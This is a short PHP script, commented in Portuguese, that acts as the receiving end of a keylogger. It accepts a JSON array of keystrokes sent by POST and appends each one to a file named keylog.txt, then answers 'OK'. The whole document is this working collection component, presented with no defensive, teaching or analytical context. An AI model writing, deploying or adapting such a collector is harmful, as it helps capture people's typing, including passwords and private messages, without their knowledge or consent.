<?php
//(A) Abre aquivos keylog, modo append
$file= fopen("keylog.txt","a+");

//(B) salva keystrokes
$keys=json_decode($_POST["keys"]);
foreach ($keys as $k=>$v) { fwrite($file,$v . PHP_EOL); }

//(C) fecha e abre
fclose($file);
echo "OK";
